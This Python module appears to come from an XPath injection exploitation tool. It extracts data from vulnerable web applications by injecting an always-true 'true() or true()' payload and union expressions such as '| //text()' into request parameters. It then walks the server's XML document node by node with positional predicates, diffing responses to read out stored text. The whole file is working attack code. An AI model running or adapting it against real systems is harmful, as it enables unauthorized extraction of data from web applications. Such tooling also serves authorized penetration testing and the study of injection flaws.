import html
import re
from difflib import SequenceMatcher

import click

from .attack import AttackContext, get_response_body, get_response_with_match

_MAX_DEPTH = 20
_MAX_CHILDREN = 500
_MAX_REQUESTS = 5000


def _strip_tags(text: str) -> str:
    """Remove HTML tags and decode entities."""
    text = re.sub(r'<[^>]+>', '\n', text)
    return html.unescape(text)


def extract_text_from_diff(empty_body: str, data_body: str) -> list[str]:
    """Extract text content present in data_body but not in empty_body.

    Strips HTML before diffing so that SequenceMatcher chunks never split
    mid-tag (which would leak fragments like '>' or '<br' as false text).
    """
    empty_text = _strip_tags(empty_body)
    data_text = _strip_tags(data_body)

    matcher = SequenceMatcher(None, empty_text, data_text, autojunk=False)
    extracted = []
    for tag, _i1, _i2, j1, j2 in matcher.get_opcodes():
        if tag in ('insert', 'replace'):
            chunk = data_text[j1:j2]
            for line in chunk.splitlines():
                line = line.strip()
                if line:
                    extracted.append(line)
    return extracted


def _classify_response(false_body: str, probe_body: str) -> tuple[str, list[str]]:
    """Classify a probe response against the false/empty baseline.

    Returns:
        ('no_results', [])    — path does not exist (response matches baseline)
        ('text', [...])       — path exists and has extractable text (leaf node)
        ('has_children', [])  — path exists but no text (intermediate node)
    """
    if false_body == probe_body:
        return "no_results", []
    lines = extract_text_from_diff(false_body, probe_body)
    if lines:
        return "text", lines
    return "has_children", []


def _make_union_overrides(context: AttackContext, xpath: str) -> dict[str, str]:
    """Build param overrides that union the given XPath into non-target params."""
    return {
        key: f"{value} | {xpath}"
        for key, value in context.parameters.items()
        if key != context.target_parameter
    }


async def _tree_traverse(context: AttackContext, false_payload: str,
                         false_body: str) -> tuple[list[str], int]:
    """Walk the XML tree via DFS using positional XPath predicates.

    Probes paths like /*[1]/*[1], /*[1]/*[2], /*[1]/*[1]/*[1], etc.
    by injecting union expressions (e.g. ``value | /*[1]/*[2]``) into
    non-target parameters.  The target parameter carries the false payload
    so the original query returns nothing — only the union path contributes
    to the response.

    Classification uses two layers for robustness across different apps:
    1. The user's match function (--true-string / --true-code) decides
       whether a path EXISTS (match=True) or not (match=False).  This
       handles dynamic content (CSRF tokens, timestamps) correctly because
       it checks for a specific indicator, not exact body equality.
    2. For existing nodes, diff against a "results baseline" (response for
       the root element) to distinguish intermediate nodes (no new text)
       from leaf nodes (extractable text).

    Returns (extracted_lines, request_count).
    """
    all_text: list[str] = []
    requests = 0

    # Fetch a "results with no data" baseline by probing the root element.
    # This captures the app's template when XPath returns a node but the
    # node has no displayable text content (intermediate element).
    results_body, results_match = await get_response_with_match(
        context, false_payload,
        _make_union_overrides(context, "/*[1]")
    )
    requests += 1

    if not results_match:
        # Root not accessible via union — can't do tree traversal
        return all_text, requests

    # Stack entries: (parent_path, child_index, depth)
    stack: list[tuple[str, int, int]] = [("/*[1]", 1, 1)]

    while stack:
        if requests >= _MAX_REQUESTS:
            click.echo(click.style(
                f'Tree traversal: hit request limit ({_MAX_REQUESTS}), stopping.',
                'yellow'
            ))
            break

        parent_path, child_idx, depth = stack.pop()
        if depth > _MAX_DEPTH or child_idx > _MAX_CHILDREN:
            continue

        current_path = f"{parent_path}/*[{child_idx}]"

        probe_body, match = await get_response_with_match(
            context, false_payload,
            _make_union_overrides(context, current_path)
        )
        requests += 1

        if not match:
            # Match function says no data — path does not exist.
            # Works even with dynamic content (timestamps, CSRF tokens)
            # because it checks a specific indicator, not the full body.
            continue

        # Path exists (match=True).  Diff against results_body to check
        # for actual text content.  Using results_body (not false_body)
        # as baseline eliminates template-level noise like
        # "No Results" → "Results:" that both share.
        lines = extract_text_from_diff(results_body, probe_body)

        if lines:
            # Leaf node with data
            for line in lines:
                click.echo(line)
            all_text.extend(lines)
            stack.append((parent_path, child_idx + 1, depth))
        else:
            # Intermediate node — no new text but path exists; descend
            stack.append((parent_path, child_idx + 1, depth))
            stack.append((current_path, 1, depth + 1))

    return all_text, requests


async def inband_extract(context: AttackContext) -> list[str] | None:
    """Extract data using in-band response diffing.

    Strategy:
    1. Simple diff (3 requests) — fast, works when app returns all rows
    2. Tree traversal via union injection — handles row-limited apps

    Returns None on failure so the caller can fall back to blind extraction.
    """
    click.echo(click.style('In-band mode: calibrating...', 'blue'))

    test_payloads = context.injection.test_payloads(context.target_parameter_value)
    false_payload = next(p for p, expected in test_payloads if not expected)

    # Build an "always true" payload to get ALL data, not just rows matching
    # the working value. Using "true() or true()" as the expression exploits
    # XPath operator precedence: "and" binds tighter than "or", so
    # "X and true() or true() and Y" becomes "(X and true()) or (true() and Y)"
    # which is always true regardless of X.
    try:
        all_data_payload = context.injection(
            context.target_parameter_value, "true() or true()"
        )
    except Exception:
        # Lambda-based injections may not accept raw strings;
        # fall back to the standard true test payload (filters by working value)
        all_data_payload = next(p for p, expected in test_payloads if expected)

    false_body = await get_response_body(context, false_payload)

    # --- Phase 1: Simple diff (3 requests) ---
    basic_body = await get_response_body(context, all_data_payload)

    has_union_params = any(
        k != context.target_parameter for k in context.parameters
    )

    if has_union_params:
        union_overrides = {
            key: f"{value} | //text()"
            for key, value in context.parameters.items()
            if key != context.target_parameter
        }
        union_body = await get_response_body(
            context, all_data_payload, union_overrides
        )
    else:
        union_body = basic_body

    basic_lines = extract_text_from_diff(false_body, basic_body)
    union_lines = extract_text_from_diff(false_body, union_body)
    diff_lines = union_lines if len(union_lines) > len(basic_lines) else basic_lines

    # --- Phase 2: Tree traversal for row-limited apps ---
    # When simple diff returns few items, there may be a row limit in effect.
    # Use DFS tree traversal to enumerate the full XML document node by node.
    if has_union_params and len(diff_lines) < 50:
        if diff_lines:
            click.echo(click.style(
                f'Simple diff found {len(diff_lines)} items. '
                'Probing tree for additional data...',
                'blue'
            ))
        else:
            click.echo(click.style(
                'Simple diff found no data. Trying tree traversal...',
                'blue'
            ))

        tree_lines, tree_requests = await _tree_traverse(
            context, false_payload, false_body
        )

        if len(tree_lines) > len(diff_lines):
            click.echo(click.style(
                f'Tree traversal: {len(tree_lines)} items '
                f'in {tree_requests} requests.',
                'green'
            ))
            return tree_lines
        elif tree_requests > 0:
            click.echo(click.style(
                f'Tree traversal: {len(tree_lines)} items in '
                f'{tree_requests} requests (no additional data found).',
                'blue'
            ))

    if not diff_lines:
        click.echo(click.style(
            'No text content found via in-band extraction.',
            'yellow'
        ))
        click.echo('Falling back to blind extraction...')
        return None

    click.echo(click.style(
        f'Extracted {len(diff_lines)} items in 3 requests.',
        'green'
    ))
    return diff_lines
